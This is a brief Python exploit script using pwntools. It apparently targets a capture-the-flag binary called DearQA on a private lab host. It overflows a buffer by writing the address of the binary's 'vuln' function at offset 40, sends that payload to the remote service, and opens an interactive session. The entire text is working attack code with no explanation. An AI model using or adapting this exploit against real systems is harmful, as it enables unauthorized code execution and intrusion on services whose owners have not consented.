from pwn import *

io = remote('10.10.76.47',5700)

exe = './DearQA.DearQA'

elf=context.binary = ELF(exe,checksec=False)

vuln_addr = elf.symbols['vuln']
info('%#x vuln_addr',vuln_addr)
payload = flat({40:vuln_addr})

io.sendafter(':',payload)
io.interactive()